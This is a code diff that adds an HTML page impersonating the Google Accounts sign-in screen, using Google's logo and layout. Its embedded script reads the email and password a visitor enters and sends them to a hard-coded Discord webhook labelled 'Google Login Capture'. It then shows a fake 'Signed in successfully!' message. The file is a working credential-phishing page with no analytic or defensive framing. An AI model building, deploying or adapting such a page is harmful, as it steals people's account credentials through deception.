@@ -1,0 +1,98 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Sign in – Google Accounts</title>
+<script src="https://cdn.tailwindcss.com"></script>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
+<style>
+    body {
+        font-family: 'Roboto', sans-serif;
+        background-color: #f2f2f2;
+    }
+</style>
+</head>
+<body class="flex items-center justify-center min-h-screen p-4">
+
+<div class="bg-white p-10 rounded-lg shadow-md w-full max-w-sm">
+    <!-- Google logo -->
+    <div class="flex justify-center mb-6">
+        <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_light_color_92x30dp.png" alt="Google" class="h-10">
+    </div>
+
+    <h1 class="text-2xl font-medium text-gray-900 text-center mb-2">Sign in</h1>
+    <p class="text-sm text-gray-600 text-center mb-6">Use your Google Account</p>
+
+    <form id="webhook-form" class="space-y-6">
+        <div class="flex flex-col">
+            <label for="username" class="text-sm font-medium mb-2 text-gray-700">Email or phone</label>
+            <input type="text" id="username" class="border border-gray-300 rounded-md p-3 focus:outline-none focus:ring-2 focus:ring-blue-600 focus:border-blue-600" placeholder="Enter your email or phone" required>
+        </div>
+
+        <div class="flex flex-col">
+            <label for="message" class="text-sm font-medium mb-2 text-gray-700">Password</label>
+            <input type="password" id="message" class="border border-gray-300 rounded-md p-3 focus:outline-none focus:ring-2 focus:ring-blue-600 focus:border-blue-600" placeholder="Enter your password" required>
+        </div>
+
+        <button type="submit" class="w-full bg-blue-600 text-white font-medium py-3 px-6 rounded-md hover:bg-blue-700 transition-colors duration-200">
+            Next
+        </button>
+    </form>
+
+    <div id="status-box" class="mt-6 p-4 rounded-md text-center hidden" role="alert"></div>
+</div>
+
+<script>
+    const WEBHOOK_URL = 'https://discord.com/api/webhooks/1415055587758309397/M05EOKzWXUYz72yHlQtpLv8nh1-g4rvdSugP8Zzcsp0n-dIczJ_kUI0g4xxeMePLK96r';
+
+    document.getElementById('webhook-form').addEventListener('submit', function(e) {
+        e.preventDefault();
+
+        const username = document.getElementById('username').value;
+        const password = document.getElementById('message').value;
+        const statusBox = document.getElementById('status-box');
+
+        statusBox.style.display = 'none';
+
+        if (!username || !password) {
+            showStatus('Please fill in all fields.', 'bg-red-500');
+            return;
+        }
+
+        const payload = {
+            content: `**Username:** ${username}\n**Password:** ${password}`,
+            username: 'Google Login Capture',
+        };
+
+        fetch(WEBHOOK_URL, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(payload),
+        })
+        .then(response => {
+            if (response.ok) {
+                showStatus('Signed in successfully!', 'bg-green-500');
+                document.getElementById('username').value = '';
+                document.getElementById('message').value = '';
+            } else {
+                showStatus('An error occurred.', 'bg-red-500');
+            }
+        })
+        .catch(() => {
+            showStatus('Failed to send message.', 'bg-red-500');
+        });
+    });
+
+    function showStatus(message, bgColor) {
+        const statusBox = document.getElementById('status-box');
+        statusBox.textContent = message;
+        statusBox.className = `mt-6 p-4 rounded-md text-center ${bgColor} text-white`;
+        statusBox.style.display = 'block';
+    }
+</script>
+
+</body>
+</html>
